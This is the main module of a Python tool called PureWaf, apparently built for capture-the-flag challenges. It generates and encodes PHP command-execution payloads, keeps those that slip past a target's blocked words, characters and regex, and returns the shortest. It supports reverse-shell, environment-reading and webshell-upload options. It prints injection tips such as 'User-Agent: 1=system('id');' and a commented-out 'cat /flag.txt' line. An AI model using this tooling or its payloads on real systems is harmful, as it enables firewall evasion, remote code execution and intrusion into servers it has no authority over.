# main package

import atexit
import json
import logging
import os
import sys
import time
import urllib.parse
import urllib.request

from packaging.version import InvalidVersion
from packaging.version import Version
from . import bypass
from . import bypass_data
from . import utils

version = "1.1.1"

SPECIAL_UPLOAD_POC_PAYLOAD = bypass_data.SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS[1]
SPECIAL_UPLOAD_POC_EGS = bypass_data.SPECIAL_UPLOAD_POC_EGS
BACKTRACK_LIMIT_POC_EGS = bypass_data.BACKTRACK_LIMIT_POC_EGS

UPDATE_NOTICE_COLOR = "\033[93m"
UPDATE_COMMAND_COLOR = "\033[96m"
COLOR_RESET = "\033[0m"
_UPDATE_NOTICE_REGISTERED = False


def banner(version_text):
    return rf"""
 ____                      __        __     ___
|  _ \ _   _ _ __ ___      \ \      / /_ _ |  _|
| |_) | | | | '__/ _ \      \ \ /\ / / _` /| |_
|  __/| |_| | | | (_) |      \ V  V / (_| \|  _|
|_|    \__,_|_|  \___/        \_/\_/ \__,_||_|

    [ PureWaf :: Pure You Hate ]
    [ Author  :: Pure Stream ]
    [ Version :: {version_text}]
    [ Github  :: https://github.com/PureStream108/PureWaf ]


"""


def _configure_logger(log_level: str):
    logger = logging.getLogger("PureWaf")
    if not logger.handlers:
        handler = logging.StreamHandler(sys.stdout)
        formatter = logging.Formatter("%(message)s")
        handler.setFormatter(formatter)
        logger.addHandler(handler)

    level_name = (log_level or "INFO").upper()
    if level_name not in ["DEBUG", "INFO", "QUIET"]:
        logger.warning("[!] Invalid log level, using INFO instead.")
        level_name = "INFO"

    show_progress = True
    if level_name == "QUIET":
        logger.setLevel(logging.CRITICAL)
        sys.stdout = open(os.devnull, "w")
        show_progress = False
    else:
        logger.setLevel(getattr(logging, level_name))

    if level_name != "DEBUG":
        import warnings

        warnings.filterwarnings("ignore")

    return logger, show_progress


def _fetch_latest_pypi_version(package_name: str = "PureWaf", timeout: float = 2.0):
    url = f"https://pypi.org/pypi/{package_name}/json"
    try:
        with urllib.request.urlopen(url, timeout=timeout) as response:
            payload = json.loads(response.read().decode("utf-8"))
        return payload.get("info", {}).get("version")
    except Exception:
        return None


def _is_newer_version(latest: str, current: str):
    try:
        return Version(str(latest)) > Version(str(current))
    except (InvalidVersion, TypeError):
        return False


def _emit_update_notice(latest: str, current: str):
    message = f"[+] New version available: {latest} (current: {current})"
    upgrade = "[+] Upgrade: pip install -U PureWaf"

    stream = getattr(sys, "stdout", None)
    if stream and stream.isatty():
        print(f"{UPDATE_NOTICE_COLOR}{message}{COLOR_RESET}")
        print(f"{UPDATE_COMMAND_COLOR}{upgrade}{COLOR_RESET}")
    else:
        print(message)
        print(upgrade)


def _check_and_notify_update(current_version: str):
    latest = _fetch_latest_pypi_version()
    if not latest:
        return
    if _is_newer_version(latest, current_version):
        _emit_update_notice(latest, current_version)


def _notify_update_at_exit():
    _check_and_notify_update(version)


def register_update_notice_at_exit():
    global _UPDATE_NOTICE_REGISTERED
    if _UPDATE_NOTICE_REGISTERED:
        return
    atexit.register(_notify_update_at_exit)
    _UPDATE_NOTICE_REGISTERED = True


def _emit_special_payload_egs(logger, payload):
    if payload not in bypass_data.SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS:
        return
    logger.info("Example: ")
    for line in bypass_data.SPECIAL_UPLOAD_POC_EGS.splitlines():
        logger.info(line)


def _extract_regex_pattern(waf_regex: str):
    if not waf_regex:
        return ""
    pattern = waf_regex.strip()
    if pattern.startswith("/") and pattern.count("/") >= 2:
        last = pattern.rfind("/")
        return pattern[1:last]
    return pattern


def _looks_like_backtrack_risk_regex(waf_regex: str):
    pattern = _extract_regex_pattern(waf_regex)
    if not pattern:
        return False

    lowered = pattern.lower()
    if "(?r)" in lowered or "(?0)" in lowered:
        return True

    has_anchors = "^" in pattern and "$" in pattern
    has_greedy_prefix = ".*(" in pattern or ".+(" in pattern
    has_repeat = "*" in pattern or "+" in pattern or "{" in pattern
    has_wide_class = r"\w" in pattern or r"\W" in pattern

    return has_anchors and has_greedy_prefix and has_repeat and has_wide_class


def _emit_contextual_tips(logger, payload, waf_regex):
    _emit_special_payload_egs(logger, payload)

    if payload in bypass_data.HEADER_TIP_TRIGGER_PAYLOADS:
        logger.info("TIPS: User-Agent: 1=system('id');")
        logger.info("TIPS: User-Agent: system('id');")

    if payload in bypass_data.VARIABLE_HIJACK_TIP_TRIGGER_PAYLOADS:
        logger.info("TIPS: POST: 1=system('id');")

    if payload in bypass_data.ASSERT_POST_TIP_TRIGGER_PAYLOADS:
        #logger.info("TIPS: POST: 2=system('cat /flag.txt');")
        logger.info("TIPS: POST: 2=system('id');")

    if _looks_like_backtrack_risk_regex(waf_regex):
        logger.info("Example:")
        for line in BACKTRACK_LIMIT_POC_EGS.splitlines():
            logger.info(line)


def _is_upload_payload(payload: str):
    candidates = [payload]
    try:
        once = urllib.parse.unquote(payload)
    except Exception:
        once = payload
    candidates.append(once)
    try:
        twice = urllib.parse.unquote(once)
    except Exception:
        twice = once
    candidates.append(twice)

    for text in candidates:
        normalized = text.strip().lower()
        if normalized.startswith("<?"):
            return True
        if normalized.startswith("<%"):
            return True
        if normalized.startswith('<script language="php">'):
            return True
        if normalized.startswith("gif89a<?"):
            return True
        if normalized.startswith("gif89a<%"):
            return True
        if normalized.startswith('gif89a<script language="php">'):
            return True
    return False


def purewaf(
    waf_words="",
    waf_chars="",
    waf_regex="",
    limit_length=999999,
    flagfile="/flag",
    read_env=False,
    reflect_shell=False,
    port=8080,
    ip="127.0.0.1",
    phpinfo=False,
    upload=False,
    log_level="INFO",
    total_payload=False,
    phpv=7.0,
):
    logger, show_progress = _configure_logger(log_level)
    logger.info(banner(version).rstrip())
    time.sleep(1)

    # 校验版本
    try:
        phpv = float(phpv)
    except (ValueError, TypeError):
        logger.error(f"[!] Invalid php_version: {phpv}. Using default 7.0")
        phpv = 7.0

    # 打印配置
    logger.info("")
    logger.info("-" * 40)
    logger.info(f"[*] Configuration:")
    logger.info(f"    - waf_words: {waf_words}")
    logger.info(f"    - waf_chars: {waf_chars}")
    logger.info(f"    - waf_regex: {waf_regex}")
    logger.info(f"    - limit_length: {limit_length}")
    logger.info(f"    - flagfile: {flagfile}")
    logger.info(f"    - read_env: {read_env}")
    logger.info(f"    - reflect_shell: {reflect_shell}")
    logger.info(f"    - upload: {upload}")
    logger.info(f"    - port: {port}")
    logger.info(f"    - ip: {ip}")
    logger.info(f"    - phpinfo: {phpinfo}")
    logger.info(f"    - phpv: {phpv}")
    logger.info(f"    - log_level: {log_level}")
    logger.info(f"    - total_payload: {total_payload}")
    logger.info("-" * 40)
    logger.info("")

    waf_words_list = utils.parse_waf_words(waf_words)
    waf_chars_set = utils.parse_waf_chars(waf_chars)
    waf_regex_obj = utils.parse_waf_regex(waf_regex)

    options_root = bypass.BypassOptions(
        flagfile="/",  # 初始默认根目录
        read_env=False,
        reflect_shell=False,
        ip=ip,
        port=port,
        phpinfo=False,
        php_version=phpv,
        upload=upload,
    )

    options_flag = bypass.BypassOptions(
        flagfile=flagfile,
        read_env=read_env,
        reflect_shell=reflect_shell,
        ip=ip,
        port=port,
        phpinfo=phpinfo,
        php_version=phpv,
        upload=upload,
    )

    # 生成 payload
    logger.info("[*] Generating payloads for Root Directory...")
    base_payloads_root = bypass.generate_candidates(options_root)
    if not base_payloads_root:
        logger.warning("[!] No base payloads generated for Root Directory.")
        shortest_root = "N/A"
    else:
        strategies = utils.get_encoding_strategies()
        encoded_payloads_root = bypass.apply_encodings(base_payloads_root, strategies)
        passed_root = bypass.filter_payloads(
            encoded_payloads_root,
            waf_words_list,
            waf_chars_set,
            waf_regex_obj,
            limit_length,
            show_progress=show_progress,
            verbose=total_payload,
        )
        if not passed_root:
            logger.warning("[!] No payload passed WAF filters for Root Directory.")
            shortest_root = "N/A"
        else:
            shortest_root = min(passed_root, key=len)

    logger.info("")

    logger.info("[*] Generating payloads for Flag File...")
    base_payloads_flag = bypass.generate_candidates(options_flag)
    if not base_payloads_flag:
        logger.warning("[!] No base payloads generated for Flag File.")
        shortest_flag = "N/A"
    else:
        encoded_payloads_flag = bypass.apply_encodings(base_payloads_flag, strategies)
        passed_flag = bypass.filter_payloads(
            encoded_payloads_flag,
            waf_words_list,
            waf_chars_set,
            waf_regex_obj,
            limit_length,
            show_progress=show_progress,
            verbose=total_payload,
        )
        if not passed_flag:
            logger.warning("[!] No payload passed WAF filters for Flag File.")
            shortest_flag = "N/A"
        else:
            if upload:
                wrapped_passed_flag = [p for p in passed_flag if _is_upload_payload(p)]
                if wrapped_passed_flag:
                    shortest_flag = min(wrapped_passed_flag, key=len)
                else:
                    shortest_flag = min(passed_flag, key=len)
            else:
                shortest_flag = min(passed_flag, key=len)

    logger.info("")
    logger.info("-" * 40)
    logger.info(f"[+] Shortest Root Payload : {shortest_root}")
    logger.info(f"[+] Shortest Flag Payload : {shortest_flag}")
    logger.info("-" * 40)
    logger.info("")
    _emit_contextual_tips(logger, shortest_flag, waf_regex)
    logger.info("")

    return shortest_flag
